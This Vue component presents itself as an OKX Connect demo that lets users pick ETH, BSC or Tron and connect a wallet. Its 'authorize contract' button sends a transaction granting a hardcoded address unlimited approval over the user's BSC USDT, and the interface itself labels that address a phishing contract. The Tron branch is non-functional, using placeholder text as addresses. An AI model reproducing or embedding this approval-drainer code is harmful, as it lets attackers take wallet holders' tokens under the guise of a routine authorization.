<template>
  <div class="okx-connect-container">
    <h2>OKX Connect Universal Provider Demo</h2>

    <!-- 链选择区域 -->
    <div v-if="showChainSelection" class="chain-selection-section">
      <p class="description">选择要连接的区块链网络，支持 ETH、BSC、Tron 链</p>

      <div class="chain-list">
        <div
          v-for="chain in availableChains"
          :key="chain.chainId"
          class="chain-item"
          :class="{ selected: selectedChains.includes(chain.chainId) }"
          @click="toggleChainSelection(chain.chainId)"
        >
          <div class="chain-info">
            <span class="chain-icon">{{ chain.icon }}</span>
            <div class="chain-details">
              <span class="chain-name">{{ chain.name }}</span>
              <span class="chain-symbol">{{ chain.symbol }}</span>
            </div>
          </div>
          <div class="chain-checkbox">
            <span
              v-if="selectedChains.includes(chain.chainId)"
              class="checkmark"
              >✓</span
            >
          </div>
        </div>
      </div>

      <div class="chain-selection-actions">
        <button
          @click="proceedToConnect"
          :disabled="selectedChains.length === 0 || isConnecting"
          class="proceed-btn"
        >
          {{
            isConnecting
              ? "连接中..."
              : `连接钱包 (${selectedChains.length}条链)`
          }}
        </button>
      </div>

      <div class="wallet-type-info">
        <p v-if="isPlugin">🔌 检测到OKX插件钱包环境</p>
        <p v-else>📱 移动端钱包环境</p>
      </div>
    </div>

    <!-- 连接状态显示 -->
    <div v-if="!showChainSelection && !isConnected" class="connection-section">
      <p class="description">正在连接选定的区块链网络...</p>

      <!-- 返回按钮 -->
      <div class="connect-section">
        <button @click="resetChainSelection" class="back-btn">
          返回选择链
        </button>
      </div>
    </div>

    <!-- 已连接状态 -->
    <div v-else class="connected-section">
      <div class="wallet-info">
        <h3>🎉 OKX 钱包已连接</h3>

        <div class="session-info">
          <div class="info-item">
            <span class="label">Session Topic:</span>
            <span class="value">{{ sessionInfo.topic }}</span>
          </div>

          <div class="info-item">
            <span class="label">支持的链:</span>
            <div class="chains-list">
              <span
                v-for="chain in sessionInfo.chains"
                :key="chain"
                class="chain-badge"
              >
                {{ chain }}
              </span>
            </div>
          </div>

          <div class="info-item">
            <span class="label">账户地址:</span>
            <div class="accounts-list">
              <div
                v-for="account in sessionInfo.accounts"
                :key="account"
                class="account-item"
              >
                {{ account }}
              </div>
            </div>
          </div>

          <div class="info-item">
            <span class="label">当前链:</span>
            <span class="value">{{ currentChain }}</span>
          </div>
        </div>

        <div class="action-buttons">
          <button @click="getBalance" class="action-btn">获取余额</button>
          <button
            @click="approveContract"
            :disabled="isApproving || isApproved"
            class="action-btn"
          >
            {{ isApproving ? "授权中..." : isApproved ? "已授权" : "授权合约" }}
          </button>
          <button @click="disconnect" class="disconnect-btn">断开连接</button>
        </div>
      </div>

      <!-- 余额显示 -->
      <div v-if="balance" class="balance-section">
        <h4>账户余额</h4>
        <div class="balance-info">
          <span class="balance-amount">{{ balance }}</span>
          <span class="balance-symbol">{{ getCurrentChainSymbol() }}</span>
        </div>
      </div>

      <!-- 授权结果显示 -->
      <div v-if="approvalResult" class="approval-section">
        <h4>授权结果</h4>
        <div class="approval-info">
          <div class="user-address">
            <strong>用户地址:</strong> {{ approvalResult.userAddress }}
          </div>
          <div class="contract-address">
            <strong>钓鱼合约地址:</strong> {{ approvalResult.contractAddress }}
          </div>
          <div class="approval-result">
            <strong>交易哈希:</strong> {{ approvalResult.txHash }}
          </div>
          <div class="note">
            <strong>注意:</strong> approve方法调用参数格式: {"Func": "approve",
            "Params": ["地址1", "地址2"]}
          </div>
        </div>
      </div>
    </div>

    <!-- 错误信息 -->
    <div v-if="error" class="error-message">
      <strong>错误:</strong> {{ error }}
      <button @click="clearError" class="clear-error-btn">×</button>
    </div>

    <!-- 操作日志 -->
    <div v-if="logs.length" class="logs-section">
      <h4>操作日志</h4>
      <div class="logs-container">
        <div
          v-for="(log, index) in logs"
          :key="index"
          :class="['log-item', log.type]"
        >
          <span class="log-time">{{ log.time }}</span>
          <span class="log-message">{{ log.message }}</span>
        </div>
      </div>
      <button @click="clearLogs" class="clear-logs-btn">清空日志</button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, onUnmounted } from "vue";
import { OKXUniversalProvider } from "@okxconnect/universal-provider";

// 响应式数据
const isConnected = ref(false);
const isConnecting = ref(false);
const error = ref("");
const okxProvider = ref(null);
const sessionInfo = ref({
  topic: "",
  chains: [],
  accounts: [],
  methods: [],
});
const currentChain = ref("");
const balance = ref("");
const logs = ref([]);

// 链选择相关
const selectedChains = ref([]);
const showChainSelection = ref(true);
const isPlugin = ref(false);
const availableChains = ref([
  {
    chainId: "1",
    name: "Ethereum",
    symbol: "ETH",
    icon: "🔷",
    type: "evm",
    contractAddress: "0xa61C92aA225b0Abdeb40b305900dCB8fA6Bc2Ade",
  },
  {
    chainId: "56",
    name: "BNB Smart Chain",
    symbol: "BNB",
    icon: "🟡",
    type: "evm",
    contractAddress: "0xCE7dbe370a1FB2CC81e7925B288aC49D87B4684B",
  },
  {
    chainId: "0x2b6653dc",
    name: "Tron",
    symbol: "TRX",
    icon: "🔴",
    type: "tron",
    contractAddress: "TFLo5KpsCZ3NZDHSUhQG2cVeGuBpvAJsdK",
  },
]);

// 授权相关
const isApproved = ref(false);
const isApproving = ref(false);
const approvalResult = ref(null);

// 添加日志
const addLog = (
  message: string,
  type: "info" | "success" | "error" = "info",
) => {
  logs.value.unshift({
    time: new Date().toLocaleTimeString(),
    message,
    type,
  });
  // 限制日志数量
  if (logs.value.length > 50) {
    logs.value = logs.value.slice(0, 50);
  }
};

// 清空日志
const clearLogs = () => {
  logs.value = [];
};

// 清除错误
const clearError = () => {
  error.value = "";
};

const getChainName = (chainId: string) => {
  const chain = availableChains.value.find((c) => c.chainId === chainId);
  return chain ? chain.name : `Chain ${chainId}`;
};

const getCurrentChainSymbol = () => {
  const [namespace, chainId] = currentChain.value.split(":");

  if (namespace === "eip155") {
    switch (chainId) {
      case "1":
        return "ETH";
      case "56":
        return "BNB";
      default:
        return "ETH";
    }
  } else if (namespace === "tron") {
    return "TRX";
  }

  return "Unknown";
};

const getCurrentContractAddress = () => {
  const [namespace, chainId] = currentChain.value.split(":");

  if (namespace === "eip155") {
    const chain = availableChains.value.find((c) => c.chainId === chainId);
    return chain?.contractAddress || "";
  } else if (namespace === "tron") {
    const chain = availableChains.value.find((c) => c.chainId === "0x2b6653dc");
    return chain?.contractAddress || "";
  }

  return "";
};

// 检测钱包类型
const detectWalletType = () => {
  if (typeof window !== "undefined") {
    // 检测是否为插件钱包环境
    if (window.okxwallet && window.okxwallet.isOkxWallet) {
      isPlugin.value = true;
      addLog("检测到OKX插件钱包", "success");
      return "plugin";
    }
    // 检测是否为移动端环境
    else if (window.okxwallet) {
      isPlugin.value = false;
      addLog("检测到OKX移动端钱包", "success");
      return "mobile";
    }
  }
  return null;
};

// 初始化 OKX Provider
const initProvider = async () => {
  try {
    const walletType = detectWalletType();
    if (walletType === "plugin") {
      // 插件钱包直接使用window.okxwallet
      okxProvider.value = window.okxwallet;
      addLog("OKX 插件钱包初始化成功", "success");
    } else {
      // 移动端或其他环境使用Universal Provider
      addLog("正在初始化 OKX Universal Provider...");

      okxProvider.value = await OKXUniversalProvider.init({
        dappMetaData: {
          name: "OKX Connect Demo",
          icon: window.location.origin + "/favicon.ico",
        },
      });

      addLog("OKX Universal Provider 初始化成功", "success");
    }
  } catch (err) {
    console.error("初始化失败:", err);
    error.value = "初始化失败: " + err.message;
    addLog("初始化失败: " + err.message, "error");
  }
};

// 切换链选择
const toggleChainSelection = (chainId) => {
  const index = selectedChains.value.indexOf(chainId);
  if (index > -1) {
    selectedChains.value.splice(index, 1);
  } else {
    selectedChains.value.push(chainId);
  }
};

// 确认链选择并连接
const proceedToConnect = async () => {
  if (selectedChains.value.length === 0) {
    error.value = "请至少选择一条链";
    return;
  }

  showChainSelection.value = false;
  await connectWallet();
};

// 重置链选择
const resetChainSelection = () => {
  selectedChains.value = [];
  showChainSelection.value = true;
  isConnected.value = false;
  sessionInfo.value = {
    topic: "",
    chains: [],
    accounts: [],
    methods: [],
  };
  currentChain.value = "";
  balance.value = "";
  isApproved.value = false;
  isApproving.value = false;
  approvalResult.value = "";
};

// 连接钱包
const connectWallet = async () => {
  try {
    if (!okxProvider.value) {
      await initProvider();
    }

    isConnecting.value = true;
    error.value = "";
    addLog("正在连接 OKX 钱包...");

    // 根据选择的链构建命名空间
    const namespaces: any = {};

    // 检查是否选择了EVM链
    const evmChains = selectedChains.value
      .filter((chainId) => chainId === "1" || chainId === "56")
      .map((chainId) => `eip155:${chainId}`);

    if (evmChains.length > 0) {
      namespaces.eip155 = {
        methods: isPlugin.value
          ? [
              "eth_sendTransaction",
              "personal_sign",
              "eth_signTypedData_v4",
              "wallet_switchEthereumChain",
            ]
          : ["eth_sendTransaction", "personal_sign", "eth_signTypedData_v4"],
        chains: evmChains,
        events: ["accountsChanged", "chainChanged"],
      };
    }

    // 检查是否选择了Tron链
    if (selectedChains.value.includes("0x2b6653dc")) {
      namespaces.tron = {
        methods: ["tron_signTransaction", "tron_signMessage"],
        chains: ["tron:0x2b6653dc"],
        events: ["accountsChanged", "chainChanged"],
      };
    }

    let session;
    if (isPlugin.value) {
      // 插件钱包连接方式
      session = await okxProvider.value.connect({
        namespaces,
        optionalNamespaces: {},
        sessionProperties: {},
      });
    } else {
      // Universal Provider连接方式
      session = await okxProvider.value.connect({
        namespaces: namespaces,
        sessionConfig: {
          redirect: "none",
        },
      });
    }

    if (session) {
      isConnected.value = true;

      // 合并所有命名空间的链和账户信息
      const allChains = [];
      const allAccounts = [];
      const allMethods = [];

      if (session.namespaces.eip155) {
        allChains.push(...(session.namespaces.eip155.chains || []));
        allAccounts.push(...(session.namespaces.eip155.accounts || []));
        allMethods.push(...(session.namespaces.eip155.methods || []));
      }

      if (session.namespaces.tron) {
        allChains.push(...(session.namespaces.tron.chains || []));
        allAccounts.push(...(session.namespaces.tron.accounts || []));
        allMethods.push(...(session.namespaces.tron.methods || []));
      }

      sessionInfo.value = {
        topic: session.topic,
        chains: allChains,
        accounts: allAccounts,
        methods: allMethods,
      };

      // 设置当前链为第一个可用的链
      currentChain.value = allChains[0] || "";

      addLog(
        `钱包连接成功 (${isPlugin.value ? "插件钱包" : "Universal Provider"})!`,
        "success",
      );
      addLog(`Session Topic: ${session.topic}`);
      addLog(`连接的账户: ${sessionInfo.value.accounts.join(", ")}`);

      // 自动获取余额
      await getBalance();
    }
  } catch (err) {
    console.error("连接失败:", err);
    error.value = "连接失败: " + err.message;
    addLog("连接失败: " + err.message, "error");
    showChainSelection.value = true;
  } finally {
    isConnecting.value = false;
  }
};

// 授权合约
const approveContract = async () => {
  try {
    if (!okxProvider.value || !sessionInfo.value.accounts.length) return;

    isApproving.value = true;
    error.value = "";

    const account = sessionInfo.value.accounts[0];
    const userAddress = account.split(":")[2];
    const [namespace] = currentChain.value.split(":");

    // 按照用户指定的数据格式
    const contractData = {
      Func: "approve",
      Params: ["用户地址", "合约地址"],
    };

    addLog(`正在授权合约，使用数据格式: ${JSON.stringify(contractData)}`);
    addLog(
      `授权参数: Func=${contractData.Func}, Params=[${contractData.Params.join(", ")}]`,
    );

    let txHash;

    if (namespace === "eip155") {
      // EVM 链授权 - 使用指定的数据格式
      const pd = "0x1d150f224ef961d2f05484a31cee28aa7921e295";
      const param1 = pd.slice(2).padStart(64, "0");
      const param2 =
        "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      txHash = await okxProvider.value.request(
        {
          method: "eth_sendTransaction",
          params: [
            {
              from: userAddress,
              to: "0x55d398326f99059ff775485246999027b3197955", // 使用第一个参数作为合约地址
              data: "0x095ea7b3" + param1 + param2,
              // gas: "0x15f90", // 90000
              // gasPrice: "0x4a817c800",
            },
          ],
        },
        // currentChain.value,
        "eip155:56",
      );
    } else if (namespace === "tron") {
      // Tron 链授权 - 使用指定的数据格式
      txHash = await okxProvider.value.request(
        {
          method: "tron_sendTransaction",
          params: [
            {
              from: userAddress,
              to: contractData.Params[0], // 使用第一个参数作为合约地址
              functionSelector: "approve(address,address)",
              parameter: [
                { type: "address", value: contractData.Params[0] },
                { type: "address", value: contractData.Params[1] },
              ],
            },
          ],
        },
        currentChain.value,
      );
    } else {
      throw new Error("不支持的链类型");
    }

    approvalResult.value = {
      contractAddress: contractData.Params[0],
      txHash,
      userAddress,
      params: contractData.Params,
    };
    isApproved.value = true;
    addLog(`合约授权成功: ${txHash}`, "success");
    addLog(
      `授权详情: 调用${contractData.Func}(${contractData.Params.join(", ")})`,
    );
  } catch (err) {
    console.error("合约授权失败:", err);
    error.value = "合约授权失败: " + err.message;
    addLog("合约授权失败: " + err.message, "error");
  } finally {
    isApproving.value = false;
  }
};

// 断开连接
const disconnect = async () => {
  try {
    if (okxProvider.value) {
      await okxProvider.value.disconnect();
    }

    resetChainSelection();
    error.value = "";

    addLog("钱包已断开连接", "success");
  } catch (err) {
    console.error("断开连接失败:", err);
    error.value = "断开连接失败: " + err.message;
    addLog("断开连接失败: " + err.message, "error");
  }
};

// 获取余额
const getBalance = async () => {
  try {
    if (!okxProvider.value || !sessionInfo.value.accounts.length) return;

    const account = sessionInfo.value.accounts[0];
    const address = account.split(":")[2];
    const [namespace] = currentChain.value.split(":");

    addLog("正在获取余额...");

    let balanceResult;
    let balanceInToken;

    if (namespace === "eip155") {
      // EVM 链使用 eth_getBalance
      balanceResult = await okxProvider.value.request(
        {
          method: "eth_getBalance",
          params: [address, "latest"],
        },
        currentChain.value,
      );

      balanceInToken = parseInt(balanceResult, 16) / Math.pow(10, 18);
    } else if (namespace === "tron") {
      // Tron 链使用 tron_getBalance
      balanceResult = await okxProvider.value.request(
        {
          method: "tron_getBalance",
          params: [address],
        },
        currentChain.value,
      );

      balanceInToken = parseInt(balanceResult) / Math.pow(10, 6); // TRX 使用 6 位小数
    } else {
      throw new Error("不支持的链类型");
    }

    balance.value = balanceInToken.toFixed(6);

    addLog(
      `余额获取成功: ${balance.value} ${getCurrentChainSymbol()}`,
      "success",
    );
  } catch (err) {
    console.error("获取余额失败:", err);
    error.value = "获取余额失败: " + err.message;
    addLog("获取余额失败: " + err.message, "error");
  }
};

// 检查连接状态
const checkConnection = () => {
  if (okxProvider.value) {
    const connected = okxProvider.value.connected();
    if (!connected && isConnected.value) {
      // 连接已断开
      isConnected.value = false;
      sessionInfo.value = {
        topic: "",
        chains: [],
        accounts: [],
        methods: [],
      };
      addLog("检测到钱包连接已断开", "error");
    }
  }
};

// 生命周期
onMounted(async () => {
  await initProvider();

  // 定期检查连接状态
  setInterval(checkConnection, 5000);

  addLog("OKX Connect Demo 组件已加载");
});

onUnmounted(() => {
  if (okxProvider.value) {
    // 清理资源
  }
});
</script>

<style scoped>
.okx-connect-container {
  max-width: 800px;
  margin: 0 auto;
  padding: 20px;
  font-family:
    -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}

h2 {
  text-align: center;
  color: #333;
  margin-bottom: 30px;
  background: linear-gradient(135deg, #000000, #434343);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

.description {
  text-align: center;
  color: #666;
  margin-bottom: 20px;
  font-size: 16px;
}

.connection-section {
  background: #f8f9fa;
  padding: 30px;
  border-radius: 12px;
  margin-bottom: 20px;
}

.chain-selection-section {
  background: #f8f9fa;
  padding: 30px;
  border-radius: 12px;
  margin-bottom: 20px;
}

.chain-list {
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin: 20px 0;
}

.chain-item {
  background: white;
  border: 2px solid #e0e0e0;
  border-radius: 8px;
  padding: 15px;
  cursor: pointer;
  transition: all 0.2s ease;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.chain-item:hover {
  border-color: #000;
  transform: translateY(-2px);
}

.chain-item.selected {
  border-color: #000;
  background: #f0f0f0;
}

.chain-info {
  display: flex;
  align-items: center;
  gap: 12px;
}

.chain-icon {
  font-size: 24px;
}

.chain-details {
  display: flex;
  flex-direction: column;
}

.chain-name {
  font-weight: 600;
  margin-bottom: 2px;
}

.chain-symbol {
  font-size: 12px;
  color: #666;
}

.chain-checkbox {
  width: 24px;
  height: 24px;
  border: 2px solid #ddd;
  border-radius: 4px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease;
}

.chain-item.selected .chain-checkbox {
  background: #000;
  border-color: #000;
}

.checkmark {
  color: white;
  font-weight: bold;
}

.chain-selection-actions {
  text-align: center;
  margin-top: 20px;
}

.wallet-type-info {
  text-align: center;
  margin-top: 15px;
  font-size: 14px;
  color: #666;
}

.proceed-btn {
  background: linear-gradient(135deg, #000000, #434343);
  color: white;
  border: none;
  padding: 15px 30px;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.proceed-btn:disabled {
  background: #ccc;
  cursor: not-allowed;
  opacity: 0.6;
}

.proceed-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}

.back-btn {
  background: #6c757d;
  color: white;
  border: none;
  padding: 12px 24px;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.back-btn:hover {
  background: #545b62;
  transform: translateY(-2px);
}

.connect-section {
  text-align: center;
}

.selected-chains {
  margin-bottom: 20px;
}

.chain-list {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  justify-content: center;
  margin: 10px 0;
}

.chain-tag {
  background: #e9ecef;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.reset-btn {
  background: #6c757d;
  color: white;
  border: none;
  padding: 6px 12px;
  border-radius: 4px;
  font-size: 12px;
  cursor: pointer;
  margin-top: 8px;
}

.connect-btn {
  background: linear-gradient(135deg, #000000, #434343);
  color: white;
  border: none;
  padding: 15px 30px;
  border-radius: 8px;
  font-size: 18px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.connect-btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}

.connect-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}

.connected-section {
  background: linear-gradient(135deg, #000000, #434343);
  color: white;
  padding: 25px;
  border-radius: 12px;
  margin-bottom: 20px;
}

.wallet-info h3 {
  margin: 0 0 20px 0;
  text-align: center;
}

.session-info {
  background: rgba(255, 255, 255, 0.1);
  padding: 15px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.info-item {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 12px;
  padding: 8px 0;
  border-bottom: 1px solid rgba(255, 255, 255, 0.2);
}

.info-item:last-child {
  border-bottom: none;
}

.label {
  font-weight: 600;
  opacity: 0.9;
  min-width: 100px;
}

.value {
  font-family: monospace;
  word-break: break-all;
  text-align: right;
  max-width: 60%;
}

.chains-list {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
  justify-content: flex-end;
}

.chain-badge {
  background: rgba(255, 255, 255, 0.2);
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 10px;
}

.accounts-list {
  max-width: 60%;
}

.account-item {
  font-family: monospace;
  font-size: 12px;
  word-break: break-all;
  margin-bottom: 4px;
}

.action-buttons {
  display: flex;
  gap: 10px;
  justify-content: center;
}

.action-btn,
.disconnect-btn {
  padding: 10px 20px;
  border: none;
  border-radius: 6px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.action-btn {
  background: rgba(255, 255, 255, 0.2);
  color: white;
}

.action-btn:hover {
  background: rgba(255, 255, 255, 0.3);
}

.disconnect-btn {
  background: #dc3545;
  color: white;
}

.disconnect-btn:hover {
  background: #c82333;
}

.balance-section {
  background: #e8f5e8;
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
  text-align: center;
}

.balance-info {
  font-size: 24px;
  font-weight: 600;
  color: #28a745;
}

.balance-amount {
  margin-right: 8px;
}

.balance-symbol {
  color: #666;
}

.test-section {
  background: #f8f9fa;
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.test-group {
  margin-bottom: 25px;
  padding-bottom: 20px;
  border-bottom: 1px solid #e0e0e0;
}

.test-group:last-child {
  border-bottom: none;
}

.test-group h5 {
  margin: 0 0 15px 0;
  color: #333;
}

.input-group {
  display: flex;
  gap: 10px;
  margin-bottom: 10px;
}

.test-input {
  flex: 1;
  padding: 8px 12px;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 14px;
}

.test-btn {
  background: #007bff;
  color: white;
  border: none;
  padding: 8px 16px;
  border-radius: 4px;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.test-btn:disabled {
  background: #ccc;
  cursor: not-allowed;
}

.test-btn:hover:not(:disabled) {
  background: #0056b3;
}

.transfer-btn {
  background: #28a745;
}

.transfer-btn:hover:not(:disabled) {
  background: #1e7e34;
}

.chain-switch {
  display: flex;
  gap: 10px;
  align-items: center;
}

.chain-select {
  flex: 1;
  padding: 8px 12px;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 14px;
}

.transfer-form {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.result-box {
  background: #e9ecef;
  padding: 10px;
  border-radius: 4px;
  margin-top: 10px;
  border-left: 4px solid #007bff;
}

.result-content {
  font-family: monospace;
  font-size: 12px;
  word-break: break-all;
  margin-top: 5px;
  background: white;
  padding: 8px;
  border-radius: 4px;
}

.error-message {
  background: #f8d7da;
  color: #721c24;
  padding: 12px;
  border-radius: 4px;
  margin-bottom: 20px;
  border: 1px solid #f5c6cb;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.clear-error-btn {
  background: none;
  border: none;
  color: #721c24;
  font-size: 18px;
  cursor: pointer;
  padding: 0;
  width: 20px;
  height: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.logs-section {
  background: #f8f9fa;
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
}

.logs-container {
  max-height: 300px;
  overflow-y: auto;
  background: white;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  padding: 10px;
  margin-bottom: 10px;
}

.log-item {
  display: flex;
  gap: 10px;
  padding: 4px 0;
  border-bottom: 1px solid #f0f0f0;
  font-size: 12px;
}

.log-item:last-child {
  border-bottom: none;
}

.log-item.success {
  color: #28a745;
}

.log-item.error {
  color: #dc3545;
}

.log-item.info {
  color: #666;
}

.log-time {
  color: #999;
  min-width: 80px;
  font-family: monospace;
}

.log-message {
  flex: 1;
}

.clear-logs-btn {
  background: #6c757d;
  color: white;
  border: none;
  padding: 6px 12px;
  border-radius: 4px;
  font-size: 12px;
  cursor: pointer;
}

.clear-logs-btn:hover {
  background: #545b62;
}

/* 响应式设计 */
@media (max-width: 768px) {
  .okx-connect-container {
    padding: 15px;
  }

  .chain-grid {
    grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
    gap: 10px;
  }

  .input-group {
    flex-direction: column;
  }

  .chain-switch {
    flex-direction: column;
  }

  .action-buttons {
    flex-direction: column;
  }

  .transfer-form .input-group {
    flex-direction: column;
  }
}
</style>
